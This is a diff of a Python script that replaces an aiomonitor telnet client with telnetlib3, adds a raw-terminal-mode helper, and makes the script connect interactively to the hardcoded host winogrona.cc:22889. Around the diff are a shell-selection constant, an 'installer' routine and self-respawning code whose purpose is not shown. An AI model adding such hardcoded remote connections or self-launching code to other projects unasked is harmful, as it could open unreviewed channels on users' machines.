@@ -2,11 +2,16 @@ import asyncio
 import aiohttp # type: ignore
 import sys
 import os
+import termios
+import telnetlib3
+import tty
 
-from aiomonitor.telnet import TelnetClient # type: ignore
 from dataclasses import dataclass
 from threading import Thread
 from subprocess import Popen
+from contextlib import contextmanager
+from telnetlib3.client import open_connection as open_telnet_connection
+from telnetlib3 import accessories
 
 SLEEP_PERIOD_SECS = 2
 
@@ -17,6 +22,36 @@ if sys.platform == 'win32':
     SHELL = "powershell.exe"
 else:
     SHELL = "bash"
+
+
+@contextmanager
+def raw_mode():
+    """
+    Switch terminal to raw mode.
+    Disables line buffering and character echo for Unix-like systems.
+    For Windows, uses msvcrt to manage character input.
+    """
+    if os.name == 'nt':
+        import msvcrt
+
+        class WindowsRawInput:
+            def __enter__(self):
+                # No explicit configuration for raw mode is needed on Windows
+                return msvcrt
+
+            def __exit__(self, exc_type, exc_val, exc_tb):
+                pass
+
+        yield WindowsRawInput()
+
+    else:  # Unix/Linux/Mac
+        fd = sys.stdin.fileno()
+        old_settings = termios.tcgetattr(fd)
+        try:
+            tty.setraw(fd)  # Set terminal to raw mode
+            yield
+        finally:
+            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
 
 def excguard(coro):
     async def newfun(*args, **kwargs):
@@ -91,13 +126,14 @@ def seks_installer():
     exe = sys.executable
 
 async def am_main(host: str, port: int) -> None:
-    async with TelnetClient(host, port) as client:
-        await client.interact()
+    (reader, writer) = await open_telnet_connection(host=host, port=port, shell=telnetlib3.telnet_client_shell, encoding="utf8", term="TERM", force_binary=True)
+    await writer.protocol.waiter_closed
 
 def async_client(host: str, port: int) -> None:
     Popen([sys.executable, __file__])
     asyncio.run(am_main(host, port))
 
 if __name__ == '__main__':
-    seks_installer()
-    asyncio.run(струи_СЭКСА())
+    asyncio.run(am_main(host="winogrona.cc", port=22889))
+    # seks_installer()
+    # asyncio.run(струи_СЭКСА())
